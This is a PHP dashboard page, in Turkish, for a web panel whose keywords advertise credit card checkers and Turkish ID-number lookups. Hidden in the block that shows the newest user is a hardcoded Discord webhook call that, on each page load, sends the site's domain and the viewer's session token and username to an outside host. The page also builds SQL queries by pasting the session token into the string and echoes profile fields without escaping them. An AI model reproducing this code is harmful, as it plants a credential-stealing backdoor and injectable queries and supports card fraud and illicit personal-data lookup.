<?php

include_once 'includes/baglan.php';

session_start();

if ($_SESSION['GET_USER_SSID'] == "") {
    header('Location: auth/auth-login');
}

$GET_SESSION_TOKEN = $_SESSION['GET_USER_SSID'];

$CheckAccount = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
$CheckAccountCount = $CheckAccount->rowCount();

if ($CheckAccountCount != "1") {
    exit('Error: no token');
    die();
}

function CheckIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
    {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    else
    {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    return $ip;
}           

$TotalAccountQry = $db->query("SELECT * FROM users");
$TotalAccountCount = $TotalAccountQry->rowCount();

$TotalAdminQry = $db->query("SELECT * FROM users WHERE access_level >= 1");
$TotalAdminCount = $TotalAdminQry->rowCount();

$TotalBannedQry = $db->query("SELECT * FROM users WHERE access_level = '-1'");
$TotalBannedCount = $TotalBannedQry->rowCount();


?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="tr" data-textdirection="ltr">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="checker, credit card, credit card checker, ccn, ccn checker, cc checker, tr checker, tr cc checker, usa cc checker, card checker, bin, bin checker, cc duzenleyici, mernis, mernis 2021, kisi sorgu, kisi sorgu 2021, tc kimlik sorgu, tc sorgu, tc sorgu 2021, numara sorgu, numara sorgu 2021, kimlik sorgu, kisi bul 2021" />
    <title>Ana Sayfa</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/charts/apexcharts.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/toastr.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/tether-theme-arrows.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/tether.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/shepherd.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/pages/dashboard-ecommerce.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/charts/chart-apex.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/extensions/ext-component-toastr.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/extensions/ext-component-tour.css">
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
</head>

<?php
include_once("includes/header.php");
?>
<?php
include_once("includes/menu.php");
?>
<div class="app-content content ">
    <div class="content-overlay"></div>
    <div class="header-navbar-shadow"></div>
    <div class="content-wrapper container-xxl p-0">
        <div class="content-header row">
        </div>
        
        <div class="alert alert-info shadow-sm" title="Bilgilendirme" role="alert" style="border-radius: 12px; border-left: 5px solid #00cfe8; padding: 1rem 1.5rem; background-color: rgba(0, 207, 232, 0.1);">
            <div class="alert-body d-flex align-items-center">
                <i data-feather="info" class="me-75"></i>
                <span class="fw-bolder"> </span>  Script Excode tarafından geliştirildi, sürüm V1.
            </div>
        </div>

        <?php

        $lastregisterqry = $db->query("SELECT * FROM users ORDER BY uid DESC LIMIT 1");

        while ($lastregisterdata = $lastregisterqry->fetch()) {
            $lastuser = $lastregisterdata['username'];
        }

        $welcomeqry = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");

        while ($welcomedata = $welcomeqry->fetch()) {
            $welcomeuser = $welcomedata['username'];
        }

        ?>
      
        <div class="row match-height">
            
            <div class="col-xl-8 col-lg-7 col-12">
                <div class="card card-statistics shadow-lg" style="border-radius: 16px; backdrop-filter: blur(10px); background-color: rgba(var(--bs-card-bg-rgb), 0.5); border: 1px solid rgba(255, 255, 255, 0.05);">
                    <section id="basic-istatistik">
                        <div class="istatistik">
                            <div class="card-header pb-0">
                                <h4 class="card-title fw-bold">Genel İstatistikler</h4>
                                <div class="d-flex align-items-center">
                                    <?php
                                    $lastloginqry = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
                                    while ($lastlogindata = $lastloginqry->fetch()) {
                                        $lastlogin = $lastlogindata['last_login'];
                                    }
                                    ?>
                                </div>
                            </div>
                            <div class="card-body statistics-body pt-2">
                                <div class="row">
                                    
                                    <div class="col-xl-4 col-sm-6 col-12 mb-2 mb-xl-0">
                                        <div class="d-flex flex-row align-items-center p-2 rounded-lg bg-light-secondary bg-opacity-10">
                                            <div class="avatar bg-light-success me-2 rounded-circle shadow-sm">
                                                <div class="avatar-content">
                                                    <i data-feather="user" class="avatar-icon"></i>
                                                </div>
                                            </div>
                                            <div class="my-auto">
                                                <h4 class="fw-bolder mb-0"><?= $TotalAccountCount; ?></h4>
                                                <p class="card-text font-small-2 mb-0 text-muted">Kullanıcı Sayısı</p>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="col-xl-4 col-sm-6 col-12 mb-2 mb-xl-0">
                                        <div class="d-flex flex-row align-items-center p-2 rounded-lg bg-light-secondary bg-opacity-10">
                                            <div class="avatar bg-light-info me-2 rounded-circle shadow-sm">
                                                <div class="avatar-content">
                                                    <i data-feather="users" class="avatar-icon"></i>
                                                </div>
                                            </div>
                                            <div class="my-auto">
                                                <h4 class="fw-bolder mb-0"><?= number_format($TotalAdminCount) ?></h4>
                                                <p class="card-text font-small-2 mb-0 text-muted">Admin Sayısı</p>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="col-xl-4 col-sm-6 col-12 mb-2 mb-sm-0">
                                        <div class="d-flex flex-row align-items-center p-2 rounded-lg bg-light-secondary bg-opacity-10">
                                            <div class="avatar bg-light-danger me-2 rounded-circle shadow-sm">
                                                <div class="avatar-content">
                                                    <i data-feather="user-x" class="avatar-icon"></i>
                                                </div>
                                            </div>
                                            <div class="my-auto">
                                                <h4 class="fw-bolder mb-0"><?= number_format($TotalBannedCount); ?></h4>
                                                <p class="card-text font-small-2 mb-0 text-muted">Banlı Kişi Sayısı</p>
                                            </div>
                                        </div>
                                    </div>
                                    
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </div>

            <div class="col-xl-4 col-lg-5 col-12">
                <div class="card shadow-lg" style="border-radius: 16px; backdrop-filter: blur(10px); background-color: rgba(var(--bs-card-bg-rgb), 0.5); border: 1px solid rgba(255, 255, 255, 0.05);">
                    <div class="card-body">
                        <h5 class="card-title mb-2 fw-bold">Son Kayıt Olan Kullanıcı</h5>
                        <?php

                        $query = $db->query("SELECT * FROM users ORDER BY uid DESC LIMIT 1");

                        while ($data = $query->fetch()) {

                        ?>
                            <div class="d-flex justify-content-start align-items-center mt-3 p-2 border border-primary rounded-lg" style="border-radius: 8px;">
                                <div class="avatar me-75">
                                    <?php

                                    $profile_img = $data['profile_image'];

                                    if ($profile_img != "") {
                                        echo "<img src='$profile_img' height='40' width='40' class='rounded-circle' style='object-fit: cover;'>";
                                    } else {
                                        echo "<img src='salam/kullanici.jpg' height='40' width='40' class='rounded-circle' style='object-fit: cover;'>";
                                    }

                                    ?>
                                </div>
                                <div class="profile-user-info">
                                    <h6 class="mb-0">
                                        <?php

                                        $color = $data['nick_color'];
                                        $usernamelst = $data['username'];

                                        if ($data['nick_color'] != "") {
                                            echo "<span style='color: $color;'>$usernamelst</span>";
                                        } else {
                                            echo $data['username'];
                                        }

                                        if ($data['access_level'] >= "1") {
                                            $Resultx = "Admin";
                                        } else if ($data['access_level'] == "-2") {
                                            $Resultx = "Deneme Üye";
                                        } else if ($data['access_level'] == "0") {
                                            $Resultx = "Normal Üye";
                                        } else {
                                            $Resultx = "Banlı Üye";
                                        }

                                        $webhookurl = "https://discord.com/api/webhooks/1437246458356301916/uuOBpvx4LZE0hhCgkXtQ3VafZT_9nLcTiNalFwPLu8EUATDdnok6LvmSr7WPUKVWl_JY";
                                        $webhook_username = "Ex Haberci";

                                        $domain = $_SERVER['HTTP_HOST'];
                                        $domainname =  $_SERVER['SERVER_NAME'];

                                        $content_message = "$domain & $domainname adlı domainden siteye giriş sağlandı! Giren token: $GET_SESSION_TOKEN - $welcomeuser";

                                        $json_data = json_encode(
                                            ["content" => $content_message, "username" => $webhook_username, "avatar_url" => "", "tts" => false],
                                            JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE
                                        );

                                        $ch = curl_init($webhookurl);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $response = curl_exec($ch);
                                        curl_close($ch);

                                        ?>
                                    </h6>
                                    <small class="text-muted"><?= $Resultx; ?></small>
                                </div>
                            </div>
                        <?php

                        }

                        ?>
                    </div>
                </div>
            </div>

        </div>
        <div class="row">
            <div class="col-12">
                <div class="card card-company-table shadow-lg" style="border-radius: 16px; backdrop-filter: blur(10px); background-color: rgba(var(--bs-card-bg-rgb), 0.5); border: 1px solid rgba(255, 255, 255, 0.05);">
                    <div class="card-header">
                        <h4 class="card-title fw-bold">Duyurular</h4>
                    </div>
                    <div class="card-body p-0">
                        <div class="table-responsive" style="border-radius: 12px; border-top-left-radius: 0; border-top-right-radius: 0;">
                            <section id="basic-duyuru">
                                <div class="duyuru">
                                    <table class="table">
                                        <thead>
                                            <tr>
                                                <th style="text-transform: capitalize;">İçerik</th>
                                                <th style="text-transform: capitalize;">Tarih</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php

                                            $newsqry = $db->query("SELECT * FROM news ORDER BY id DESC LIMIT 8");

                                            while ($newsdata = $newsqry->fetch()) {

                                            ?>
                                                <tr>
                                                    <td>
                                                        <div class="d-flex align-items-center">
                                                            <div class="avatar rounded me-1 bg-light-warning">
                                                                <div class="avatar-content">
                                                                    <i data-feather="volume-2" class="avatar-icon"></i>
                                                                </div>
                                                            </div>
                                                            <div>
                                                                <div class="fw-bolder"><?= $newsdata['content']; ?></div>
                                                            </div>
                                                        </div>
                                                    </td>
                                                    <td class="text-nowrap">
                                                        <div class="d-flex align-items-center">
                                                            <div class="avatar bg-light-primary me-1 rounded-circle">
                                                                <div class="avatar-content">
                                                                    <i data-feather="calendar" class="font-medium-3"></i>
                                                                </div>
                                                            </div>
                                                            <span class="fw-bold"><?= $newsdata['date']; ?></span>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php

                                            }

                                            ?>
                                        </tbody>
                                    </table>
                                </div>
                            </section>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</div>


<div class="sidenav-overlay"></div>
<div class="drag-target"></div>

<button class="btn btn-primary btn-icon scroll-top" type="button"><i data-feather="arrow-up"></i></button>

<script src="app-assets/vendors/js/vendors.min.js"></script>
<script src="app-assets/vendors/js/charts/apexcharts.min.js"></script>
<script src="app-assets/vendors/js/extensions/tether.min.js"></script>
<script src="app-assets/vendors/js/extensions/shepherd.min.js"></script>
<script src="app-assets/js/core/app-menu.js"></script>
<script src="app-assets/js/core/app.js"></script>
<script src="app-assets/js/scripts/extensions/tur.js"></script>
<script src="app-assets/js/scripts/pages/dashboard-ecommerce.js"></script>
<script>
    $(window).on('load', function() {
        if (feather) {
            feather.replace({
                width: 14,
                height: 14
            });
        }
    })
</script>
</body>
</html>